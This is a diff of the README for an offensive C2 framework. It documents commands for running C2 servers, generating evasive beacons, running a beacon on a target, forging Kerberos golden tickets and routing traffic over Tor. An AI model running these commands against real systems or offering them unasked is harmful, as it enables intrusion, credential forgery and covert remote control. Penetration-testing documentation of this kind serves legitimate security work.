@@ -1,11 +1,8 @@
 # ⚠️ Disclaimer  
 **This is only a weak demo version and will not meet everyone’s expectations.**  
 Use it strictly for **educational and authorized penetration testing purposes** only.  
-
 ---
-
 # 🌸 Elaina C2 Framework  
-
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)  
 [![Python](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)  
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/yuri08loveelaina/elaina-c2)  
@@ -51,6 +48,7 @@ It is designed to assist security professionals in **Active Directory assessment
 ---
 
 ## ⚙️ System Requirements  
+
 - **Python** 3.8+  
 - **OS**: Windows, Linux, macOS  
 - **RAM**: Minimum 4GB (8GB+ recommended)  
@@ -61,14 +59,14 @@ It is designed to assist security professionals in **Active Directory assessment
 ## 🚀 Installation  
 
 - Clone the repository and install dependencies:  
-```bash
+```
 git clone https://github.com/yuri08loveelaina/elaina-c2.git
 cd elaina-c2
-sudo apt update
 sudo apt install python3-pip python3-venv
 python3 -m venv venv
 source venv/bin/activate
 pip install -r requirements.txt
+sudo apt update
 ```
 - Install Dependencies
 ```
@@ -76,20 +74,18 @@ pip install PyQt5 selenium requests beautifulsoup4 colorama \
             undetected-chromedriver selenium-wire impacket \
             stem cryptography cloudscraper certipy
 ```
-## 🖥️ Usage  
+# 🖥️ Usage
 
-- Launch GUI
+### Launch GUI
+
 ```
 python elaina-cute.py --gui
 ```
-
 - Or simply run without arguments
 ```
 python elaina-cute.py
 ```
-
- ## Command-Line Examples
-
+## Command-Line Examples
 - Web scan
 ```
 python elaina-cute.py https://example.com
@@ -104,100 +100,83 @@ python elaina-cute.py https://example.com --tor
 ```
 python elaina-cute.py https://example.com --ldap-subnet 10.0.0.0/24
 ```
-
 - With Burp Suite
 ```
 python elaina-cute.py https://example.com --burp
 ```
-
 - Start C2 Server (HTTP)
 ```
 python elaina-cute.py --c2-server --c2-host 0.0.0.0 --c2-port 8080
 ```
-
 - Start C2 Server (HTTPS)
 ```
 python elaina-cute.py --c2-server --c2-host 0.0.0.0 --c2-port 8443 \
   --c2-ssl --c2-cert /path/to/cert.pem --c2-key /path/to/key.pem
 ```
-
 - Golden Ticket Generation
 ```
 python elaina-cute.py --golden-ticket \
   --gt-domain EXAMPLE.COM --gt-user administrator \
   --gt-krbtgt-hash <hash> --gt-sid <sid>
 ```
-
 - Complete AD Assessment
 ```
 python elaina-cute.py https://internal.example.com \
   --ldap-subnet 10.0.0.0/24 --winrm-user admin --winrm-pass password
 ```
 
-- C2 Infrastructure Setup
-
-- Terminal 1: Start C2 Server 
+- Generate Beacon from CLI
 ```
-python elaina-cute.py --c2-server --c2-host 0.0.0.0 --c2-port 8443 \
-  --c2-ssl --c2-cert /path/to/cert.pem --c2-key /path/to/key.pem
+python elaina-cute.py --generate-beacon --listener-name http-listener \
+  --output-format exe --profile-path /path/to/profile.profile \
+  --output-path /path/to/beacon.exe
 ```
+# 📚 Documentation
 
-- Terminal 2: Start Beacon on target
-```
-python elaina-cute.py --c2-beacon --c2-beacon-host example.com \
-  --c2-beacon-port 8443 --c2-beacon-ssl
-```
+## Command Line Options
 
-- Golden Ticket Attack
-```
-python elaina-cute.py --golden-ticket \
-  --gt-domain EXAMPLE.COM --gt-user administrator \
-  --gt-krbtgt-hash aad3b435b51404eeaad3b435b51404ee:... \
-  --gt-sid S-1-5-21-... --gt-target dc01.example.com \
-  --gt-command "whoami"
-```
-## 📚 Documentation  
+| Option | Description |
+|--------|-------------|
+| `--gui` | Launch GUI interface |
+| `--tor` | Route traffic through TOR |
+| `--tor-pass` | TOR control password (default: yuriontop) |
+| `--burp` | Forward requests to Burp Repeater API |
+| `--ldap-subnet` | Scan subnet via LDAP |
+| `--winrm-user` | WinRM username |
+| `--winrm-pass` | WinRM password |
+| `--pfx-path` | Path to .pfx certificate |
+| `--pfx-password` | Password for .pfx certificate |
+| `--golden-ticket` | Generate Kerberos Golden Ticket |
+| `--c2-server` | Start C2 server |
+| `--c2-beacon` | Start C2 beacon |
+| `--silver-c2` | Start Silver C2 beacon |
+| `--generate-beacon` | Generate a beacon from CLI |
+| `--listener-name` | Name of the listener to use for beacon |
+| `--output-format` | Output format of the beacon (exe, py, ps1, raw) |
+| `--profile-path` | Path to the .profile or .json file |
+| `--output-path` | Path to save the generated beacon |
 
-### Command Line Options  
+## 🏗️ Architecture
 
-| Option         | Description                               |
-|----------------|-------------------------------------------|
-| `--gui`        | Launch GUI interface                      |
-| `--tor`        | Route traffic through TOR                 |
-| `--tor-pass`   | TOR control password (default: yuriontop) |
-| `--burp`       | Forward requests to Burp Repeater API     |
-| `--ldap-subnet`| Scan subnet via LDAP                      |
-| `--winrm-user` | WinRM username                            |
-| `--winrm-pass` | WinRM password                            |
-| `--pfx-path`   | Path to .pfx certificate                  |
-| `--pfx-password`| Password for .pfx certificate            |
-| `--golden-ticket`| Generate Kerberos Golden Ticket         |
-| `--c2-server`  | Start C2 server                           |
-| `--c2-beacon`  | Start C2 beacon                           |
-| `--silver-c2`  | Start Silver C2 beacon                    |
-## 🏗️ Architecture  
+- **Core Engine** – exploitation & post-exploitation  
+- **C2 Framework** – beacon management & communications  
+- **GUI** – PyQt5-based dashboard  
+- **CLI** – automation & scripting interface  
+- **Encryption Module** – secure comms  
+- **Evasion Module** – stealth & defense bypass  
 
-Core Engine – exploitation & post-exploitation  
-C2 Framework – beacon management & communications  
-GUI – PyQt5-based dashboard  
-CLI – automation & scripting interface  
-Encryption Module – secure comms  
-Evasion Module – stealth & defense bypass  
+## 📜 License
 
-## 📜 License  
+This project is licensed under the MIT License – see the LICENSE file.
 
-This project is licensed under the MIT License – see the LICENSE file.  
-
-## ⚠️ Disclaimer  
+## ⚠️ Disclaimer
 
 This tool is for educational and authorized security testing only.  
-The authors are not responsible for any misuse.  
+The authors are not responsible for any misuse.
 
-## 🙏 Acknowledgments  
+## 🙏 Acknowledgments
 
-Impacket Project – networking backbone  
-PyQt5 Team – GUI framework  
-Security researchers for techniques & inspiration  
-All contributors ❤️  
-
-
+- Impacket Project – networking backbone  
+- PyQt5 Team – GUI framework  
+- Security researchers for techniques & inspiration  
+- All contributors ❤️
